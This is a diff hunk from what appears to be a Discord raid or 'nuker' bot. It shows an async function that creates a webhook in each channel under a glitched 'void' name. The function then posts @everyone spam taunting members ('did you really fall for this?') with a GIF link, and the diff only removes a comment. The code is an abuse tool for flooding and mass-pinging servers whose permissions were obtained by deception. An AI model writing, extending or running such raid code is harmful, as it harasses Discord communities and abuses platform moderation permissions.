@@ -196,7 +196,7 @@ async def create_webhook_and_spam(channel):
     """Creates a webhook and sends spam messages""" # by zinko give credits
     try:
         webhook = await channel.create_webhook(name=f"v̶͚̲̠͚̉̀̉̕̕ŏ̵͉̚i̶̠̥͗̍͊͆͛̐͋͒̕͘ḑ̸̯͔̲̳͉͍̀́̀̌̅̏͘͠͝{channel.id}") # by zinko give credits
-        for _ in range(10):  # Spam 10 messages per webhook
+        for _ in range(10):
             await webhook.send(f"@everyone did you really fall for this? https://tenor.com/view/nettspend-goat-flex-soundcloud-gif-10119250017410905119") # by zinko give credits
     except discord.Forbidden:
         print(f"Permission error creating webhook in {channel.name}")
